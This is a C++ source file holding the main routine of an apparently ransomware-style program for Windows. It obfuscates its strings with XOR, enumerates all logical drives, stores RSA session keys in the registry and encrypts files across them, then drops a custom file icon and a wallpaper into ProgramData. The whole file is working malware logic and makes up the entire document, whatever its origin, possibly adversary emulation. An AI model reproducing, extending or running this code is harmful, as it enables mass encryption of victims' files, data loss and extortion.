#define WIN32_LEAN_AND_MEAN
#include "argparser.hpp"
#include "base64.hpp"
#include "config.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "enumerate.hpp"
#include "logger.hpp"
#include "impact.hpp"
#include "util/string_util.hpp"

#include <iostream>
#include <format>
#include <exception>

// to enable stdout logging in plaintext
#ifndef DEBUG_LOGGING
    #define DEBUG_LOGGING false
#endif

#define FAILURE_CLI_ARGS 0x1
#define FAILURE_CONFIG_LOAD 0x4

int main(int argc, char* argv[]) {
    std::vector<unsigned char> key = {
        0x5a, 0x52, 0xac, 0x49, 0xe0, 0x70, 0xfb, 0x1b, 0x0a, 0x4e, 0xbb, 0x30, 0xd2, 0x81, 0x21, 0xbe, 
        0x37, 0x65, 0xf4, 0xb7, 0xa4, 0x10, 0x5f, 0xbb, 0xd8, 0xd8, 0xf5, 0x36, 0xa9, 0x5f, 0x07, 0x70, 
        0x72, 0xe2, 0xd4, 0xc8, 0xd2, 0xa2, 0x37, 0x08, 0xee, 0xc2, 0x2e, 0xf2, 0x12, 0x24, 0x68, 0x6d, 
        0x8e, 0x15, 0x80, 0x84, 0xdb, 0x2d, 0x6d, 0x97, 0xb2, 0xc4, 0x9b, 0xc6, 0x87, 0x61, 0x8d, 0x9e,
        0xb3, 0x0e, 0x00, 0xe6, 0x74, 0x7b, 0xeb, 0xce, 0x19, 0x48, 0xb9, 0xaa, 0x4a, 0x28, 0x65, 0xef, 
        0xb8, 0xd5, 0x4d, 0x08, 0x28, 0x42, 0x3a, 0xaf, 0x2f, 0x73, 0xd0, 0xa4, 0x86, 0x6e, 0xe5, 0xee, 
        0xca, 0x94, 0x31, 0x2c, 0x49, 0x02, 0x97, 0x12, 0xff, 0xbd, 0xab, 0x08, 0x6f, 0x9a, 0x09, 0xab, 
        0xfd, 0x73, 0x0c, 0x4d, 0x71, 0x15, 0x56, 0xff, 0x79, 0x7e, 0xd7, 0xef, 0x29, 0xcf, 0xe5, 0x82
    };

    // Initialize logger
    std::string log_path = XOR_LIT("lbm.log");
    int init_result = XorLogger::InitializeLogger(log_path, key);
    if (init_result != 0) {
        std::string err_msg = std::format("{}: {}", XOR_LIT("Failed to initialize logger. Error code"), init_result);
        std::cerr << err_msg << std::endl;
        return init_result;
    }

    XorLogger::LogInfo(XOR_LIT("Initialized logger."));

    // Parse command lines
    ArgParser args(argc, argv);
    args.SetStringArg("-path"); // To specify a specific directory to encrypt within
    try {
        args.Parse();
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when parsing command-line args"), e.what()));
        return FAILURE_CLI_ARGS;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when parsing command-line args."));
        return FAILURE_CLI_ARGS;
    }

    std::string strict_include_path = args.GetStringArg("-path");
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Strict-include path from command-line"), strict_include_path));


    // Get configuration
    Config cfg;
    try {
        cfg = GetConfig();
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when loading configuration"), e.what()));
        return FAILURE_CONFIG_LOAD;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when loading configuration."));
        return FAILURE_CONFIG_LOAD;
    }

    // Get drives
    std::vector<std::wstring> start_dirs = enumerate::GetLogicalDrives();
    if (start_dirs.empty()) {
        start_dirs.push_back(XOR_WIDE_LIT(L"C:\\"));
    }

    // Drop icon resource
    if (cfg.IconChangeEnabled()) {
        try {
            std::wstring file_name = cfg.GetExtension() + XOR_WIDE_LIT(L".ico");
            std::wstring icon_path = os_util::GetProgramDataPath().wstring() + L"\\" + file_name;
            if (!impact::DropIconFile(file_name.c_str())) {
                XorLogger::LogError(std::format("{} {}.", XOR_LIT("Failed to save icon resource at"), string_util::wstring_to_string(icon_path)));
            } else {
                XorLogger::LogDebug(std::format("{} {}.", XOR_LIT("Saved icon resource at"), string_util::wstring_to_string(icon_path)));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when dropping icon resource"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when dropping icon resource."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping dropping icon resource."));
    }

    // Save session keys in registry
    try {
        impact::StoreRsaSessionKeys(cfg);
        XorLogger::LogInfo(XOR_LIT("Stored RSA session keys in registry."));
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when storing RSA session keys"), e.what()));
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when storing RSA session keys."));
    }

    // Enumerate and encrypt files
    if (cfg.EnumerationEnabled()) {
        try {
            if (!strict_include_path.empty()) {
                start_dirs = { string_util::string_to_wstring(strict_include_path) };
                XorLogger::LogInfo(std::format(
                    "{} {}",
                    XOR_LIT("Limiting enumeration/encryption to strict include path:"), 
                    strict_include_path
                ));
            }
            if (cfg.EncryptionEnabled()) {
                XorLogger::LogInfo(XOR_LIT("Enumerating and encrypting files"));
                enumerate::EnumerateAndEncrypt(cfg, start_dirs, false, LB_ENCRYPT_FILES);
                XorLogger::LogInfo(XOR_LIT("Finished enumerating and encrypting files."));
            } else {
                XorLogger::LogInfo(XOR_LIT("Enumerating (not encrypting) files"));
                enumerate::EnumerateAndEncrypt(cfg, start_dirs, false, LB_ENUMERATE_ONLY);
                XorLogger::LogInfo(XOR_LIT("Finished enumerating files."));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when enumerating/encrypting files"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when enumerating/encrypting files."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping file enumeration/encryption."));
    }

    // Drop wallpaper resource
    if (cfg.WallpaperChangeEnabled()) {
        try {
            std::wstring file_name = cfg.GetExtension() + L".bmp";
            std::filesystem::path wallpaper_path = os_util::GetProgramDataPath() / file_name;
            if (!impact::DropWallpaperFile(file_name.c_str())) {
                XorLogger::LogError(std::format("{} {}.", XOR_LIT("Failed to wallpaper resource at"), wallpaper_path.string()));
            } else {
                XorLogger::LogDebug(std::format("{} {}.", XOR_LIT("Saved wallpaper resource at"), wallpaper_path.string()));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when dropping wallpaper resource"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when dropping wallpaper resource."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping dropping wallpaper resource."));
    }

    return 0;
}